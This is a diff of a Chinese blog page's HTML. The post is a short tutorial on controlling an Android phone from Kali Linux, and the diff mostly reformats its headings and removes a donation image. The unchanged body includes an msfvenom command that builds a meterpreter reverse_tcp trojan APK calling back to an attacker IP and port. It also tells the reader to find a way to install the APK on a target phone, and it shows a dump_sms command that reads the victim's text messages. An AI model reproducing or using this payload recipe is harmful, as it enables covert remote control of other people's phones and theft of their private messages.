@@ -456,7 +456,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    428
+                    420
                 </div>
                 
 
@@ -478,12 +478,11 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="kali-linux-控制安卓手机"><a href="#kali-linux-控制安卓手机" class="headerlink" title="kali linux 控制安卓手机"></a>kali linux 控制安卓手机</h1><p>##前言</p>
-<ul>
-<li>本博客并不是写给零基础的，不是很详细<br>##准备</li>
+                <h1 id="kali-linux-控制安卓手机"><a href="#kali-linux-控制安卓手机" class="headerlink" title="kali linux 控制安卓手机"></a>kali linux 控制安卓手机</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
+<li>本博客并不是写给零基础的，不是很详细<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2></li>
 <li>1.VMware Workstation Pro 虚拟机 版本任意 建议14或15 版本</li>
 <li>2.kali linux 2020镜像  建议使用用迅雷下载<br>  <a target="_blank" rel="noopener" href="https://mirrors.aliyun.com/kali-images/kali-2020.2/kali-linux-2020.2-live-amd64.iso">官网镜像</a></li>
-<li>一部测试用的并且和kali Linux在一个网段下的安卓手机或者用电脑中的模拟器也可以 但是有一些命令无法执行比如:拍照….<br>##开始</li>
+<li>一部测试用的并且和kali Linux在一个网段下的安卓手机或者用电脑中的模拟器也可以 但是有一些命令无法执行比如:拍照….<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2></li>
 <li>首先打开已经安装好的kali linux,启动终端，输入 ipconfig 查看 当前系统IP地址<pre class="line-numbers language-none"><code class="language-none">ipconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 <li>然后执行 msfvenom -p android/meterpreter/reverse_tcp LHOST= 这里输入刚才查出来的IP地址 LPORT=这里输入端口号 R &gt; 木马软件的名字.apk<pre class="line-numbers language-none"><code class="language-none">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=8888 R &gt; text.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 <li>想办法将做出来的软件安装到目标手机上，这里我就将软件直接安装到手机上</li>
@@ -501,7 +500,6 @@ dump_sms  # 获取短信内容<span aria-hidden="true" class="line-numbers-rows"
 
 </li>
 </ul>
-<h2 id="博客不易，欢迎支持"><a href="#博客不易，欢迎支持" class="headerlink" title="博客不易，欢迎支持"></a>博客不易，欢迎支持</h2><p><img src="https://img-blog.csdnimg.cn/20200618225619693.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MzczMTQ5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
 <h1 id="持续更新中……"><a href="#持续更新中……" class="headerlink" title="持续更新中……."></a>持续更新中…….</h1><script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -765,11 +763,10 @@ dump_sms  # 获取短信内容<span aria-hidden="true" class="line-numbers-rows"
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            kali linux 控制安卓手机##前言
-
-本博客并不是写给零基础的，不是很详细##准备
+                            kali linux 控制安卓手机前言
+本博客并不是写给零基础的，不是很详细准备
 1.VMware Workstation Pro 虚拟机 版本任意 建议14或15 版本
-2.kali linux 2020镜像  建议使用用迅雷下
+2.kali linux 2020镜像  建议使用用迅雷下载  官网
                         
                     </div>
                     <div class="publish-info">
